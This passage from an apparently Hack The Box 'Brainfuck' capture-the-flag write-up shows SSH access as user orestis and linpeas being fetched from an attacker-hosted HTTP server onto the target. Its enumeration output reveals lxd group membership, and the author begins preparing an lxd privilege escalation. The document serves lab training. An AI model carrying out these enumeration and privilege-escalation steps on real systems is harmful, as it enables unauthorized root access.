</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span><span class=mf>10.10.10.17</span><span class=s1>&#39; (ED25519) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=s1>Enter passphrase for key &#39;</span><span class=p>.</span><span class=o>/</span><span class=nx>id_rsa</span><span class=err>&#39;</span><span class=o>:</span> 
</span></span><span class=line><span class=cl><span class=nx>Welcome</span> <span class=nx>to</span> <span class=nx>Ubuntu</span> <span class=mf>16.04.2</span> <span class=nx>LTS</span> <span class=p>(</span><span class=nx>GNU</span><span class=o>/</span><span class=nx>Linux</span> <span class=mf>4.4.0</span><span class=o>-</span><span class=mi>75</span><span class=o>-</span><span class=nx>generic</span> <span class=nx>x86_64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=nx>Documentation</span><span class=o>:</span>  <span class=nx>https</span><span class=o>:</span><span class=c1>//help.ubuntu.com
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=o>*</span> <span class=nx>Management</span><span class=o>:</span>     <span class=nx>https</span><span class=o>:</span><span class=c1>//landscape.canonical.com
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=o>*</span> <span class=nx>Support</span><span class=o>:</span>        <span class=nx>https</span><span class=o>:</span><span class=c1>//ubuntu.com/advantage
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=mi>0</span> <span class=nx>packages</span> <span class=nx>can</span> <span class=nx>be</span> <span class=nx>updated</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=mi>0</span> <span class=nx>updates</span> <span class=nx>are</span> <span class=nx>security</span> <span class=nx>updates</span><span class=p>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>You</span> <span class=nx>have</span> <span class=nx>mail</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=nx>Last</span> <span class=nx>login</span><span class=o>:</span> <span class=nx>Mon</span> <span class=nx>Oct</span>  <span class=mi>3</span> <span class=mi>19</span><span class=o>:</span><span class=mi>41</span><span class=o>:</span><span class=mi>38</span> <span class=mi>2022</span> <span class=nx>from</span> <span class=mf>10.10.14.23</span>
</span></span><span class=line><span class=cl><span class=nx>orestis</span><span class=err>@</span><span class=nx>brainfuck</span><span class=o>:~</span><span class=nx>$</span> <span class=nx>ls</span>
</span></span><span class=line><span class=cl><span class=nx>debug</span><span class=p>.</span><span class=nx>txt</span>  <span class=nx>encrypt</span><span class=p>.</span><span class=nx>sage</span>  <span class=nx>mail</span>  <span class=nx>output</span><span class=p>.</span><span class=nx>txt</span>  <span class=nx>user</span><span class=p>.</span><span class=nx>txt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>orestis</span><span class=err>@</span><span class=nx>brainfuck</span><span class=o>:~</span><span class=nx>$</span> <span class=nx>cat</span> <span class=nx>user</span><span class=p>.</span><span class=nx>txt</span>
</span></span></code></pre></div><h2 id=root>root<a hidden class=anchor aria-hidden=true href=#root>#</a></h2><p>I checked some files on <code>orestis</code> &rsquo;s directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>orestis@brainfuck:~$ cat debug.txt 
</span></span><span class=line><span class=cl><span class=m>7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span>
</span></span><span class=line><span class=cl><span class=m>7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span>
</span></span><span class=line><span class=cl><span class=m>30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span>
</span></span><span class=line><span class=cl>orestis@brainfuck:~$ cat output.txt 
</span></span><span class=line><span class=cl>Encrypted Password: <span class=m>44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span>
</span></span></code></pre></div><p>I am thinking find the exploit with linepeas
Get on local machine</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
</span></span><span class=line><span class=cl>--2023-05-09 08:38:22--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
</span></span><span class=line><span class=cl>Resolving github.com <span class=o>(</span>github.com<span class=o>)</span>... 20.27.177.113
</span></span><span class=line><span class=cl>Connecting to github.com <span class=o>(</span>github.com<span class=o>)</span><span class=p>|</span>20.27.177.113<span class=p>|</span>:443... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>302</span> Found
</span></span><span class=line><span class=cl>Location: https://github.com/carlospolop/PEASS-ng/releases/download/20230508-32e5ab22/linpeas.sh <span class=o>[</span>following<span class=o>]</span>
</span></span><span class=line><span class=cl>--2023-05-09 08:38:23--  https://github.com/carlospolop/PEASS-ng/releases/download/20230508-32e5ab22/linpeas.sh
</span></span><span class=line><span class=cl>Reusing existing connection to github.com:443.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>302</span> Found
</span></span><span class=line><span class=cl>Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/277b0143-641e-4cd9-bc57-a411b6b7c47a?X-Amz-Algorithm<span class=o>=</span>AWS4-HMAC-SHA256<span class=p>&amp;</span>X-Amz-Credential<span class=o>=</span>AKIAIWNJYAX4CSVEH53A%2F20230509%2Fus-east-1%2Fs3%2Faws4_request<span class=p>&amp;</span>X-Amz-Date<span class=o>=</span>20230509T123823Z<span class=p>&amp;</span>X-Amz-Expires<span class=o>=</span>300<span class=p>&amp;</span>X-Amz-Signature<span class=o>=</span>4fb1cdc81baafd763e73c02070f4921368aeb21caa6669b065ca2694a33f68ee<span class=p>&amp;</span>X-Amz-SignedHeaders<span class=o>=</span>host<span class=p>&amp;</span><span class=nv>actor_id</span><span class=o>=</span>0<span class=p>&amp;</span><span class=nv>key_id</span><span class=o>=</span>0<span class=p>&amp;</span><span class=nv>repo_id</span><span class=o>=</span>165548191<span class=p>&amp;</span>response-content-disposition<span class=o>=</span>attachment%3B%20filename%3Dlinpeas.sh<span class=p>&amp;</span>response-content-type<span class=o>=</span>application%2Foctet-stream <span class=o>[</span>following<span class=o>]</span>
</span></span><span class=line><span class=cl>--2023-05-09 08:38:23--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/277b0143-641e-4cd9-bc57-a411b6b7c47a?X-Amz-Algorithm<span class=o>=</span>AWS4-HMAC-SHA256<span class=p>&amp;</span>X-Amz-Credential<span class=o>=</span>AKIAIWNJYAX4CSVEH53A%2F20230509%2Fus-east-1%2Fs3%2Faws4_request<span class=p>&amp;</span>X-Amz-Date<span class=o>=</span>20230509T123823Z<span class=p>&amp;</span>X-Amz-Expires<span class=o>=</span>300<span class=p>&amp;</span>X-Amz-Signature<span class=o>=</span>4fb1cdc81baafd763e73c02070f4921368aeb21caa6669b065ca2694a33f68ee<span class=p>&amp;</span>X-Amz-SignedHeaders<span class=o>=</span>host<span class=p>&amp;</span><span class=nv>actor_id</span><span class=o>=</span>0<span class=p>&amp;</span><span class=nv>key_id</span><span class=o>=</span>0<span class=p>&amp;</span><span class=nv>repo_id</span><span class=o>=</span>165548191<span class=p>&amp;</span>response-content-disposition<span class=o>=</span>attachment%3B%20filename%3Dlinpeas.sh<span class=p>&amp;</span>response-content-type<span class=o>=</span>application%2Foctet-stream
</span></span><span class=line><span class=cl>Resolving objects.githubusercontent.com <span class=o>(</span>objects.githubusercontent.com<span class=o>)</span>... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
</span></span><span class=line><span class=cl>Connecting to objects.githubusercontent.com <span class=o>(</span>objects.githubusercontent.com<span class=o>)</span><span class=p>|</span>185.199.110.133<span class=p>|</span>:443... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>830029</span> <span class=o>(</span>811K<span class=o>)</span> <span class=o>[</span>application/octet-stream<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘linpeas.sh’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>linpeas.sh                                                 100%<span class=o>[========================================================================================================================================</span>&gt;<span class=o>]</span> 810.58K  --.-KB/s    in 0.01s   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023-05-09 08:38:23 <span class=o>(</span>58.5 MB/s<span class=o>)</span> - ‘linpeas.sh’ saved <span class=o>[</span>830029/830029<span class=o>]</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ mv linpeas.sh lab/brainfuck                      
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ <span class=nb>cd</span> lab/brainfuck                 
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/lab/brainfuck<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ ls
</span></span><span class=line><span class=cl>41006.html  id_rsa  linpeas.sh  ssh.hash                                      
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/lab/brainfuck<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ python3 -m http.server <span class=m>8080</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>8080</span> <span class=o>(</span>http://0.0.0.0:8080/<span class=o>)</span> ...
</span></span></code></pre></div><p>Get on lab machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>orestis@brainfuck:~$ wget http://10.10.14.32:8080/linpeas.sh
</span></span><span class=line><span class=cl>--2023-05-09 15:40:12--  http://10.10.14.32:8080/linpeas.sh
</span></span><span class=line><span class=cl>Connecting to 10.10.14.32:8080... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>830029</span> <span class=o>(</span>811K<span class=o>)</span> <span class=o>[</span>text/x-sh<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘linpeas.sh’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>linpeas.sh                                                 100%<span class=o>[========================================================================================================================================</span>&gt;<span class=o>]</span> 810.58K  1.84MB/s    in 0.4s    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023-05-09 15:40:12 <span class=o>(</span>1.84 MB/s<span class=o>)</span> - ‘linpeas.sh’ saved <span class=o>[</span>830029/830029<span class=o>]</span>
</span></span></code></pre></div><p>Run <code>linpeas.sh</code> and output result.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>orestis</span><span class=err>@</span><span class=nx>brainfuck</span><span class=o>:~</span><span class=nx>$</span> <span class=p>.</span><span class=o>/</span><span class=nx>linpeas</span><span class=p>.</span><span class=nx>sh</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                            <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span class=line><span class=cl>                    <span class=err>▄▄▄▄▄▄▄</span>             <span class=err>▄▄▄▄▄▄▄▄</span>
</span></span><span class=line><span class=cl>             <span class=err>▄▄▄▄▄▄▄</span>      <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>  <span class=err>▄▄▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄▄▄▄</span>     <span class=err>▄</span> <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span> <span class=err>▄▄▄▄▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄</span>    <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span> <span class=err>▄▄▄▄▄</span>       <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄▄▄▄▄▄▄▄▄▄▄</span>          <span class=err>▄▄▄▄▄▄</span>               <span class=err>▄▄▄▄▄▄</span> <span class=err>▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄▄▄▄▄▄</span>              <span class=err>▄▄▄▄▄▄▄▄</span>                 <span class=err>▄▄▄▄</span> 
</span></span><span class=line><span class=cl>         <span class=err>▄▄</span>                  <span class=err>▄▄▄</span> <span class=err>▄▄▄▄▄</span>                  <span class=err>▄▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄▄</span>                <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄</span>                  <span class=err>▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄</span>            <span class=err>▄▄</span> <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>   <span class=err>▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄</span>      <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>                                <span class=err>▄▄▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄▄▄▄▄</span>  <span class=err>▄▄▄▄▄</span>                       <span class=err>▄▄▄▄▄▄</span>     <span class=err>▄▄▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄▄▄▄</span>   <span class=err>▄▄▄▄▄</span>                       <span class=err>▄▄▄▄▄</span>      <span class=err>▄</span> <span class=err>▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄▄▄▄▄</span>  <span class=err>▄▄▄▄▄</span>        <span class=err>▄▄▄▄▄▄▄</span>        <span class=err>▄▄▄▄▄</span>     <span class=err>▄▄▄▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄▄▄▄▄▄</span>  <span class=err>▄▄▄▄▄▄▄</span>      <span class=err>▄▄▄▄▄▄▄</span>      <span class=err>▄▄▄▄▄▄▄</span>   <span class=err>▄▄▄▄▄</span> 
</span></span><span class=line><span class=cl>          <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>        <span class=err>▄</span>          <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span> 
</span></span><span class=line><span class=cl>         <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄</span>                       <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄▄▄▄▄▄▄▄▄▄▄</span>                         <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span class=line><span class=cl>         <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>            <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span>
</span></span><span class=line><span class=cl>          <span class=err>▀▀▄▄▄</span>   <span class=err>▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span> <span class=err>▄▄▄▄▄▄▄▀▀▀▀▀▀</span>
</span></span><span class=line><span class=cl>               <span class=err>▀▀▀▄▄▄▄▄</span>      <span class=err>▄▄▄▄▄▄▄▄▄▄</span>  <span class=err>▄▄▄▄▄▄▀▀</span>
</span></span><span class=line><span class=cl>                     <span class=err>▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>/---------------------------------------------------------------------------------\</span>
</span></span><span class=line><span class=cl>    <span class=o>|</span>                             <span class=nx>Do</span> <span class=nx>you</span> <span class=nx>like</span> <span class=nx>PEASS</span><span class=o>?</span>                                  <span class=o>|</span>                                                                                                                                                     
</span></span><span class=line><span class=cl>    <span class=o>|---------------------------------------------------------------------------------|</span>                                                                                                                                                     
</span></span><span class=line><span class=cl>    <span class=o>|</span>         <span class=nx>Get</span> <span class=nx>the</span> <span class=nx>latest</span> <span class=nx>version</span>    <span class=o>:</span>     <span class=nx>https</span><span class=o>:</span><span class=c1>//github.com/sponsors/carlospolop |                                                                                                                                                     
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=o>|</span>         <span class=nx>Follow</span> <span class=nx>on</span> <span class=nx>Twitter</span>         <span class=o>:</span>     <span class=err>@</span><span class=nx>carlospolopm</span>                           <span class=o>|</span>                                                                                                                                                     
</span></span><span class=line><span class=cl>    <span class=o>|</span>         <span class=nx>Respect</span> <span class=nx>on</span> <span class=nx>HTB</span>            <span class=o>:</span>     <span class=nx>SirBroccoli</span>                             <span class=o>|</span>                                                                                                                                                     
</span></span><span class=line><span class=cl>    <span class=o>|---------------------------------------------------------------------------------|</span>                                                                                                                                                     
</span></span><span class=line><span class=cl>    <span class=o>|</span>                                 <span class=nx>Thank</span> <span class=nx>you</span><span class=o>!</span>                                      <span class=o>|</span>                                                                                                                                                     
</span></span><span class=line><span class=cl>    <span class=err>\</span><span class=o>---------------------------------------------------------------------------------</span><span class=err>/                                                                                                                                                     </span>
</span></span><span class=line><span class=cl>          <span class=nx>linpeas</span><span class=o>-</span><span class=nx>ng</span> <span class=nx>by</span> <span class=nx>carlospolop</span>                                                                                                                                                                                                         
</span></span><span class=line><span class=cl>                                                                                                                                                                                                                                            
</span></span><span class=line><span class=cl><span class=nx>ADVISORY</span><span class=o>:</span> <span class=nx>This</span> <span class=nx>script</span> <span class=nx>should</span> <span class=nx>be</span> <span class=nx>used</span> <span class=k>for</span> <span class=nx>authorized</span> <span class=nx>penetration</span> <span class=nx>testing</span> <span class=nx>and</span><span class=o>/</span><span class=nx>or</span> <span class=nx>educational</span> <span class=nx>purposes</span> <span class=nx>only</span><span class=p>.</span> <span class=nx>Any</span> <span class=nx>misuse</span> <span class=k>of</span> <span class=k>this</span> <span class=nx>software</span> <span class=nx>will</span> <span class=nx>not</span> <span class=nx>be</span> <span class=nx>the</span> <span class=nx>responsibility</span> <span class=k>of</span> <span class=nx>the</span> <span class=nx>author</span> <span class=nx>or</span> <span class=k>of</span> <span class=nx>any</span> <span class=nx>other</span> <span class=nx>collaborator</span><span class=p>.</span> <span class=nx>Use</span> <span class=nx>it</span> <span class=nx>at</span> <span class=nx>your</span> <span class=nx>own</span> <span class=nx>computers</span> <span class=nx>and</span><span class=o>/</span><span class=nx>or</span> <span class=kd>with</span> <span class=nx>the</span> <span class=nx>computer</span> <span class=nx>owner</span><span class=err>&#39;</span><span class=nx>s</span> <span class=nx>permission</span><span class=p>.</span>                                                                                                                                                                                              
</span></span><span class=line><span class=cl>                                                                                                                                                                                                                                            
</span></span><span class=line><span class=cl><span class=nx>Linux</span> <span class=nx>Privesc</span> <span class=nx>Checklist</span><span class=o>:</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=nx>LEGEND</span><span class=o>:</span>                                                                                                                                                                                                                                    
</span></span><span class=line><span class=cl>  <span class=nx>RED</span><span class=o>/</span><span class=nx>YELLOW</span><span class=o>:</span> <span class=mi>95</span><span class=o>%</span> <span class=nx>a</span> <span class=nx>PE</span> <span class=nx>vector</span>
</span></span><span class=line><span class=cl>  <span class=nx>RED</span><span class=o>:</span> <span class=nx>You</span> <span class=nx>should</span> <span class=nx>take</span> <span class=nx>a</span> <span class=nx>look</span> <span class=nx>to</span> <span class=nx>it</span>
</span></span><span class=line><span class=cl>  <span class=nx>LightCyan</span><span class=o>:</span> <span class=nx>Users</span> <span class=kd>with</span> <span class=nx>console</span>
</span></span><span class=line><span class=cl>  <span class=nx>Blue</span><span class=o>:</span> <span class=nx>Users</span> <span class=nx>without</span> <span class=nx>console</span> <span class=o>&amp;</span> <span class=nx>mounted</span> <span class=nx>devs</span>
</span></span><span class=line><span class=cl>  <span class=nx>Green</span><span class=o>:</span> <span class=nx>Common</span> <span class=nx>things</span> <span class=p>(</span><span class=nx>users</span><span class=p>,</span> <span class=nx>groups</span><span class=p>,</span> <span class=nx>SUID</span><span class=o>/</span><span class=nx>SGID</span><span class=p>,</span> <span class=nx>mounts</span><span class=p>,</span> <span class=p>.</span><span class=nx>sh</span> <span class=nx>scripts</span><span class=p>,</span> <span class=nx>cronjobs</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>  <span class=nx>LightMagenta</span><span class=o>:</span> <span class=nx>Your</span> <span class=nx>username</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=nx>Starting</span> <span class=nx>linpeas</span><span class=p>.</span> <span class=nx>Caching</span> <span class=nx>Writable</span> <span class=nx>Folders</span><span class=p>...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                               <span class=err>╔═══════════════════╗</span>
</span></span><span class=line><span class=cl><span class=err>═══════════════════════════════╣</span> <span class=nx>Basic</span> <span class=nx>information</span> <span class=err>╠═══════════════════════════════</span>                                                                                                                                                         
</span></span><span class=line><span class=cl>                               <span class=err>╚═══════════════════╝</span>                                                                                                                                                                                        
</span></span><span class=line><span class=cl><span class=nx>OS</span><span class=o>:</span> <span class=nx>Linux</span> <span class=nx>version</span> <span class=mf>4.4.0</span><span class=o>-</span><span class=mi>75</span><span class=o>-</span><span class=nx>generic</span> <span class=p>(</span><span class=nx>buildd</span><span class=err>@</span><span class=nx>lgw01</span><span class=o>-</span><span class=mi>21</span><span class=p>)</span> <span class=p>(</span><span class=nx>gcc</span> <span class=nx>version</span> <span class=mf>5.4.0</span> <span class=mi>20160609</span> <span class=p>(</span><span class=nx>Ubuntu</span> <span class=mf>5.4.0</span><span class=o>-</span><span class=mi>6</span><span class=nx>ubuntu1</span><span class=o>~</span><span class=mf>16.04.4</span><span class=p>)</span> <span class=p>)</span> <span class=err>#</span><span class=mi>96</span><span class=o>-</span><span class=nx>Ubuntu</span> <span class=nx>SMP</span> <span class=nx>Thu</span> <span class=nx>Apr</span> <span class=mi>20</span> <span class=mi>09</span><span class=o>:</span><span class=mi>56</span><span class=o>:</span><span class=mi>33</span> <span class=nx>UTC</span> <span class=mi>2017</span>
</span></span><span class=line><span class=cl><span class=nx>User</span> <span class=o>&amp;</span> <span class=nx>Groups</span><span class=o>:</span> <span class=nx>uid</span><span class=o>=</span><span class=mi>1000</span><span class=p>(</span><span class=nx>orestis</span><span class=p>)</span> <span class=nx>gid</span><span class=o>=</span><span class=mi>1000</span><span class=p>(</span><span class=nx>orestis</span><span class=p>)</span> <span class=nx>groups</span><span class=o>=</span><span class=mi>1000</span><span class=p>(</span><span class=nx>orestis</span><span class=p>),</span><span class=mi>4</span><span class=p>(</span><span class=nx>adm</span><span class=p>),</span><span class=mi>24</span><span class=p>(</span><span class=nx>cdrom</span><span class=p>),</span><span class=mi>30</span><span class=p>(</span><span class=nx>dip</span><span class=p>),</span><span class=mi>46</span><span class=p>(</span><span class=nx>plugdev</span><span class=p>),</span><span class=mi>110</span><span class=p>(</span><span class=nx>lxd</span><span class=p>),</span><span class=mi>121</span><span class=p>(</span><span class=nx>lpadmin</span><span class=p>),</span><span class=mi>122</span><span class=p>(</span><span class=nx>sambashare</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>Hostname</span><span class=o>:</span> <span class=nx>brainfuck</span>
</span></span><span class=line><span class=cl><span class=nx>Writable</span> <span class=nx>folder</span><span class=o>:</span> <span class=err>/dev/shm</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=o>/</span><span class=nx>bin</span><span class=o>/</span><span class=nx>ping</span> <span class=nx>is</span> <span class=nx>available</span> <span class=k>for</span> <span class=nx>network</span> <span class=nx>discovery</span> <span class=p>(</span><span class=nx>linpeas</span> <span class=nx>can</span> <span class=nx>discover</span> <span class=nx>hosts</span><span class=p>,</span> <span class=nx>learn</span> <span class=nx>more</span> <span class=kd>with</span> <span class=o>-</span><span class=nx>h</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=o>/</span><span class=nx>bin</span><span class=o>/</span><span class=nx>bash</span> <span class=nx>is</span> <span class=nx>available</span> <span class=k>for</span> <span class=nx>network</span> <span class=nx>discovery</span><span class=p>,</span> <span class=nx>port</span> <span class=nx>scanning</span> <span class=nx>and</span> <span class=nx>port</span> <span class=nx>forwarding</span> <span class=p>(</span><span class=nx>linpeas</span> <span class=nx>can</span> <span class=nx>discover</span> <span class=nx>hosts</span><span class=p>,</span> <span class=nx>scan</span> <span class=nx>ports</span><span class=p>,</span> <span class=nx>and</span> <span class=nx>forward</span> <span class=nx>ports</span><span class=p>.</span> <span class=nx>Learn</span> <span class=nx>more</span> <span class=kd>with</span> <span class=o>-</span><span class=nx>h</span><span class=p>)</span>                                                                         
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=o>/</span><span class=nx>bin</span><span class=o>/</span><span class=nx>nc</span> <span class=nx>is</span> <span class=nx>available</span> <span class=k>for</span> <span class=nx>network</span> <span class=nx>discovery</span> <span class=o>&amp;</span> <span class=nx>port</span> <span class=nx>scanning</span> <span class=p>(</span><span class=nx>linpeas</span> <span class=nx>can</span> <span class=nx>discover</span> <span class=nx>hosts</span> <span class=nx>and</span> <span class=nx>scan</span> <span class=nx>ports</span><span class=p>,</span> <span class=nx>learn</span> <span class=nx>more</span> <span class=kd>with</span> <span class=o>-</span><span class=nx>h</span><span class=p>)</span>                                                                                                              
</span></span><span class=line><span class=cl><span class=o>===</span> <span class=nx>snipped</span> <span class=o>===</span>
</span></span></code></pre></div><p>This user joined <code>lxd</code> group.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>User <span class=p>&amp;</span> Groups: <span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>orestis<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>orestis<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>orestis<span class=o>)</span>,4<span class=o>(</span>adm<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,110<span class=o>(</span>lxd<span class=o>)</span>,121<span class=o>(</span>lpadmin<span class=o>)</span>,122<span class=o>(</span>sambashare<span class=o>)</span>
</span></span></code></pre></div><p>We can exploit it.</p><p><a href=https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></p><p>On local machine</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ wget wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
</span></span><span class=line><span class=cl>--2023-05-09 08:54:55--  http://wget/
</span></span><span class=line><span class=cl>Resolving wget <span class=o>(</span>wget<span class=o>)</span>... failed: Temporary failure in name resolution.
</span></span><span class=line><span class=cl>wget: unable to resolve host address ‘wget’
</span></span><span class=line><span class=cl>--2023-05-09 08:54:55--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
</span></span><span class=line><span class=cl>Resolving raw.githubusercontent.com <span class=o>(</span>raw.githubusercontent.com<span class=o>)</span>... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
</span></span><span class=line><span class=cl>Connecting to raw.githubusercontent.com <span class=o>(</span>raw.githubusercontent.com<span class=o>)</span><span class=p>|</span>185.199.108.133<span class=p>|</span>:443... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>8060</span> <span class=o>(</span>7.9K<span class=o>)</span> <span class=o>[</span>text/plain<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘build-alpine’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>build-alpine                                               100%<span class=o>[========================================================================================================================================</span>&gt;<span class=o>]</span>   7.87K  --.-KB/s    in 0s      
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023-05-09 08:54:55 <span class=o>(</span>41.9 MB/s<span class=o>)</span> - ‘build-alpine’ saved <span class=o>[</span>8060/8060<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>FINISHED --2023-05-09 08:54:55--
</span></span><span class=line><span class=cl>Total wall clock time: 0.3s
